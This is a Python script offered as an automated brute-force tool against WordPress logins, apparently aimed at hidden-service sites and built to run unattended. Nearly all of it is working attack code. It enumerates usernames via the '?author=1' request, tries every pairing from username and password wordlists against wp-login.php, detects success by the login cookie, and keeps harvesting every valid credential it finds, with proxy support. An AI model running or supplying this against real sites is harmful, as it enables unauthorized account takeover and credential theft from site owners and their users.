#!/usr/bin/env python3
"""
Automated WordPress Brute Force for Hidden Services
No user interaction required - designed for automated scanning
"""

import os
import sys
import time
import requests
import re
import logging
from datetime import datetime

class WordPressBruteForceAuto:
    """Automated WordPress brute force attack"""
    
    def __init__(self, target, username_file, password_file, threads=10, timeout=30, proxies=None):
        """Initialize WordPress brute force"""
        self.target = target
        self.username_file = username_file
        self.password_file = password_file
        self.threads = threads
        self.timeout = timeout
        self.proxies = proxies or {}
        self.results = []
        
        # Configure requests session
        self.session = requests.Session()
        self.session.proxies.update(self.proxies)
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
    
    def _validate_wordpress(self):
        """Check if target is a WordPress site"""
        try:
            logging.info(f"Validating WordPress site: {self.target}")
            response = self.session.get(self.target, timeout=self.timeout)
            
            if 'wp-content' in response.text or '/wp-login.php' in response.text:
                logging.info(f"Confirmed WordPress site: {self.target}")
                return True
            else:
                logging.warning(f"Not a WordPress site: {self.target}")
                return False
        except Exception as e:
            logging.error(f"Error validating WordPress site: {e}")
            return False
    
    def _enumerate_username(self):
        """Try to enumerate username from WordPress"""
        try:
            logging.info("Attempting username enumeration")
            response = self.session.get(f'{self.target}/?author=1', timeout=self.timeout)
            
            if '/author/' in response.text:
                match = re.search(r'/author/([^/"]+)', response.text)
                if match:
                    username = match.group(1)
                    if username != 'feed':
                        logging.info(f"Enumerated username: {username}")
                        return username
            
            logging.info("Username enumeration failed")
            return None
        except Exception as e:
            logging.error(f"Error enumerating username: {e}")
            return None
    
    def _load_file(self, filepath):
        """Load wordlist from file"""
        try:
            if not os.path.isfile(filepath):
                logging.error(f"File not found: {filepath}")
                return []
            
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            
            logging.info(f"Loaded {len(lines)} entries from {filepath}")
            return lines
        except Exception as e:
            logging.error(f"Error loading file {filepath}: {e}")
            return []
    
    def _get_wp_form_values(self):
        """Get WordPress login form values"""
        try:
            response = self.session.get(f'{self.target}/wp-login.php', timeout=self.timeout)
            
            wp_submit = re.search(r'class="button button-primary button-large" value="(.*?)"', response.text)
            wp_redirect = re.search(r'name="redirect_to" value="(.*?)"', response.text)
            
            wp_submit_value = wp_submit.group(1) if wp_submit else 'Log In'
            wp_redirect_value = wp_redirect.group(1) if wp_redirect else f'{self.target}/wp-admin/'
            
            return wp_submit_value, wp_redirect_value
        except Exception as e:
            logging.error(f"Error getting WordPress form values: {e}")
            return 'Log In', f'{self.target}/wp-admin/'
    
    def _attempt_login(self, username, password, wp_submit, wp_redirect):
        """Attempt to login with credentials"""
        try:
            post_data = {
                'log': username,
                'pwd': password,
                'wp-submit': wp_submit,
                'redirect_to': wp_redirect,
                'testcookie': 1
            }
            
            response = self.session.post(
                f'{self.target}/wp-login.php',
                data=post_data,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # Check for successful login
            if 'wordpress_logged_in_' in str(response.cookies):
                logging.info(f"✓ SUCCESS: {username}:{password}")
                return True
            
            return False
            
        except Exception as e:
            logging.debug(f"Login attempt failed: {e}")
            return False
    
    def run(self):
        """Run the automated brute force attack"""
        logging.info(f"Starting WordPress brute force on {self.target}")
        
        # Validate WordPress
        if not self._validate_wordpress():
            logging.error("Target is not a valid WordPress site")
            return []
        
        # Try to enumerate username
        enumerated_user = self._enumerate_username()
        
        # Load wordlists
        usernames = self._load_file(self.username_file)
        passwords = self._load_file(self.password_file)
        
        if not usernames:
            logging.error("No usernames loaded")
            return []
        
        if not passwords:
            logging.error("No passwords loaded")
            return []
        
        # If enumerated username found, use it first
        if enumerated_user and enumerated_user not in usernames:
            usernames.insert(0, enumerated_user)
        
        # Get WordPress form values
        wp_submit, wp_redirect = self._get_wp_form_values()
        
        # Perform brute force
        total = len(usernames) * len(passwords)
        current = 0
        
        logging.info(f"Testing {len(usernames)} username(s) with {len(passwords)} password(s) ({total} combinations)")
        
        for username in usernames:
            for password in passwords:
                current += 1
                
                if current % 10 == 0:
                    progress = (current / total) * 100
                    logging.info(f"Progress: {current}/{total} ({progress:.1f}%)")
                
                if self._attempt_login(username, password, wp_submit, wp_redirect):
                    result = {
                        'timestamp': datetime.now().isoformat(),
                        'target': self.target,
                        'username': username,
                        'password': password,
                        'service_type': 'wordpress'
                    }
                    self.results.append(result)
                    
                    # Don't break - continue to find all valid credentials
                
                # Small delay to avoid overwhelming the target
                time.sleep(0.5)
        
        logging.info(f"Completed. Found {len(self.results)} credential(s)")
        return self.results
